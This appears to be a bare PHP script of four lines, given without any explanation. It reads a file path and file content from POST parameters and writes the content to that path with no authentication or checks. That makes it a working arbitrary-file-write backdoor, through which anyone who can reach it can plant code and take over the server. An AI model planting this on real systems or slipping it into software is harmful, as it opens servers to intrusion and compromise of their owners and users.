<?php

$dir = $_POST['dir'];
$content = $_POST['content'];
file_put_contents($dir, $content);